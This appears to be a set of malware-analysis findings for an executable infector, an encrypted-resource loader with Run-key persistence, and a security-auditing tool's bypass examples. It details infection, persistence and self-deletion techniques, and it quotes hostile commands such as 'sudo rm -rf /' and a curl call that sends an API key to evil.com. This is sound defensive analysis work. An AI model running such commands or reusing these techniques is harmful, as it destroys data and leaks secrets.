Require an actual parsed import thunk there rather than a particular spelling or an optional IAT data-directory entry. Preserve size/path/callee/write/launch links and notable severity.

samples.identification: yyzUSB executable infector and resource wrapper (Elex-profile identity)
samples.marker: yyzUSB infector: overwrites EXEs with self plus original host
evidence: The *.exe traversal at VA 0x46b229 calls thunk 0x44e4ba at 0x46b2ad, reaching 0x46d550. This gets its own module path, copies itself to a temporary wrapper, reads the target executable, puts those bytes in RCDATA resource 99, and overwrites that same target with the wrapper at 0x46d7b3. This is executable infection, not an installer resource update.

The host restoration branch copies the wrapper, loads its RCDATA, writes host.exe at 0x46db71, starts it through CreateProcessW at 0x46dbdd, waits, and deletes temporary files. The legitimate host is preserved so the infected program still appears to work.

The URLDownloadToFileW path resolves its API dynamically at 0x46502f, downloads to its CString-derived destination at 0x46505a, and passes the same destination to ShellExecuteW at 0x46507f. example.com endpoints are placeholders and are not evidence of a live controller.

The security-product targeting path populates ZhuDongFangYu.exe alongside process targets. The PhysicalMemory access helper at 0x471270 changes object security through GetSecurityInfo, SetEntriesInAclW and SetSecurityInfo; its callers use OS-dependent kernel offsets. Retain the existing SSDT/AV-reference profile without claiming observed successful SSDT restoration.

PE resources 132 and 134 are the related debug-built Daemon and USBMonitorSrv components, identified by PDBs and independently inspected imports. Resource 99 is a Microsoft OpenJDK java.exe host (21.0.9); its legitimate identity does not excuse the outer executable overwrite.
samples.judgment_balance: Debug builds, USB-monitor UI and placeholder download URLs permit research-tool origins. Nevertheless, reachable executable traversal and self-wrapper overwrite with original-host relaunch establish infection. No authorized laboratory or installation context was provided.
samples.coverage: Retain all four hostile findings and both suspicious identity findings. Drive traversal, resource extraction/write/launch, process termination, security-object access and downloading also have notable detections. Do not attribute Remcos, Amadey or SmokeLoader merely from the collection filename.

samples.identification: Urelas MSMP-profile network and encrypted-resource loader
samples.marker: Urelas MSMP loader: hidden payload, Run persistence; fix stage rule
evidence: WinMain 0x401081 reaches initialization 0x40128b, state handling, networking, payload staging 0x402432, and cleanup 0x403141. The state reader/writer complement 512-byte records and validate MSMP, independently of helper names.

At 0x4025a4 the resource helper 0x402974 finds resource 131, obtains its size and calls LoadResource. The caller passes its returned buffer and size to 0x402278 at 0x4025c2. That helper invokes ZIP extraction, appends generated padding, and passes the prepared bytes to the bound CreateFileW/WriteFile helper 0x408bfe. ShellExecuteW at 0x4025e6 targets the same destination.

The resource-pointer conversion IAT slot 0x41c034 is imported as SetHandleCount rather than LockResource. Its output is treated as a pointer in the copy sequence. This can break runtime staging; static evidence establishes the attempt, not successful payload execution. The PE also leaves the optional IAT data-directory entry zero despite having parsed import descriptors.

Offline decryption of resource IDR_BINARY/131 with embedded password 1234 yields HanAgent_pe.exe, 228352 bytes, SHA-256 0742a171ff4693bb30cd153ca77039b1012b867ed7fa4aef30be00526ee55678. Its PECompact2 bootstrap imports LoadLibraryA/GetProcAddress/VirtualAlloc/VirtualFree and has three suspicious packing/control-flow findings. Its full unpacked behavior is unresolved; no screenshot or credential-theft behavior is inferred from that member.

RegOpenKeyExW and RegSetValueExW use the Windows NT CurrentVersion Windows key and Run value with the executable path. The same registry handle and value are bound by the existing persistence matcher. TrayKey is a separate stored value, not itself an autorun surface.

Cleanup gets its own module path, substitutes it twice into a del/if-exist/goto retry template, writes the batch at 0x40325c and launches it with ShellExecuteA at 0x40327b. Network code uses socket/connect/send/recv and endpoint fallback through 0x402655; this does not by itself establish arbitrary remote-command execution.

The BIOS-read/far-return finding is accurate: resource 130 is a distinct 205-byte boot-code resource, not encrypted ZIP noise. At file offset 142915 it loads AX=0201, invokes INT 13h and transfers to segment 07c0:0. Keep it notable; no boot installation or destructive boot write is claimed.
samples.judgment_balance: Concealed executable delivery, transformed controller state, unwanted Run activation and own-image cleanup establish a covert loader. No benign deployment purpose is supplied. Incorrect import binding limits execution success but does not remove malicious intent.
samples.coverage: The corrected neutral staging observation activates the existing hostile concealed-state/self-deleting resource-loader composite. Persistence, payload activation attempt and malware identity now provide three hostile findings across distinct subdirectories; the accurate suspicious cleanup detection remains.

samples.marker: cc-audit 3.11.2: security auditor with attack test examples
evidence: Cargo.toml declares cc-audit version 3.11.2 and its security-auditing purpose. main.rs dispatches explicit check/hook/serve/proxy operations and prints help when no command is given. handlers/scan.rs and run/scanner.rs route supplied paths through rule scanning. rules/builtin/exfiltration.rs constructs regex detection rules; it is not a live exfiltration client.

All five suspicious observations reside in documented examples/bypass-attempts members: four decoder-to-execution observations in hex-octal.sh, and one live /dev/tcp shell-redirection observation in reverse-shells/polyglot.sh. They accurately describe executable attack examples and must not be suppressed merely because the archive is benign.

Decoded hex/octal commands include sudo rm -rf / and curl https://evil.com -d $API_KEY; printf reconstructs curl as a command word. The Base32 literal MNUGK4TF actually decodes to chere, contradicting its curl comment, but is still piped to bash, so the decoder-to-shell detection is accurate.

polyglot.sh contains active Python, Perl, Ruby, PHP, Bash, awk, Lua, telnet and socat shell examples. node-evasion.js demonstrates computed child_process loading, eval/Function/vm execution, a Base64 curl command, worker execution, and secret-send examples. These are standalone test examples, not imports or build hooks reached by the CLI.

Real non-test process creation in remote/clone.rs invokes git for user-requested repository scanning; feedback/submitter.rs invokes gh for explicit report submission. Neither establishes concealed execution of the bypass examples. The checked package has no build.rs activating them.
samples.judgment_balance: The consistent source implementation, explicit scan dispatch, detection-rule construction, and documented adversarial-example packaging tip the verdict to benign. The scripts would remain dangerous if separately executed. Exact upstream archive authenticity and machine deployment history were not independently established.
samples.coverage: Retain all five suspicious findings and their notable capability evidence; no package-name exception or severity reduction was added. No fetched dependency was responsible for these findings.

classifier_disagreement: Historical HOSTILE queue is unsupported for cc-audit. Current terminal rescan returns BENIGN[48%] and exit 0, despite high raw probability and level -1 in the JSON aggregate. The two PEs remain alerted at level 25; no verdict changes from the trait edit. The installed model warns it uses feature specification 18 rather than 21.
limitations: Static reachability does not prove runtime success. No installation history or user authorization was supplied. The PECompact child was extracted and inspected but not fully unpacked. Exact-sample Triage pages were inaccessible. No new claim relies on sandbox-only behavior.
validation: make validate is required as the final operation after this evidence and markers are written.
